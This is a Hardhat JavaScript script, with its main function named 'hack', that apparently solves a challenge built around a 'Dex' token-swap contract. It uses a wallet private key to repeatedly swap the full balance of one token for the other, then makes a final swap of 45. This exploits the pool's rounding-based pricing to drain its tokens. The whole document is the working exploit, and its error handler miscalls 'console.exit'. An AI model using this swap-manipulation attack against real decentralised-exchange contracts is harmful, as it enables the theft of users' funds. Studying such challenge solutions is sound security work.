const { ethers, network } = require("hardhat")
const { developmentChains } = require("../helper-hardhat-config")
require("dotenv").config()

let provider, player, contract, token1, token2, tx

async function hack() {
    provider = await ethers.getDefaultProvider(network.config.url)
    player = new ethers.Wallet(process.env.PRIVATE_KEY, provider)
    contract = await ethers.getContractAt(
        "Dex",
        "0x347b15c671355CC399A69f4af1b73c3C7E414A0F",
        player
    )
    token1 = await contract.token1()
    token2 = await contract.token2()

    console.log(network.name)
    console.log(network.config.url)

    await getBalances()

    tx = await contract.approve(contract.address, 100000)
    await tx.wait(1)

    for (let i = 0; i < 5; i++) {
        const [tokenIn, tokenOut] = i % 2 === 0 ? [token1, token2] : [token2, token1]
        tx = await contract.swap(tokenIn, tokenOut, contract.balanceOf(tokenIn, player.address))
        await tx.wait(1)
    }

    tx = await contract.swap(token2, token1, 45)
    await tx.wait(1)

    await getBalances()
}

async function getBalances() {
    const playerBalanceT1 = await contract.balanceOf(token1, player.address)
    const playerBalanceT2 = await contract.balanceOf(token2, player.address)
    const contractBalanceT1 = await contract.balanceOf(token1, contract.address)
    const contractBalanceT2 = await contract.balanceOf(token2, contract.address)

    console.log(
        `*Player* Token 1 balance: ${playerBalanceT1} | Token 2 balance: ${playerBalanceT2}`
    )
    console.log(
        `*Contract* Token 1 balance: ${contractBalanceT1} | Token 2 balance: ${contractBalanceT2}`
    )
}

hack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        console.exit(1)
    })
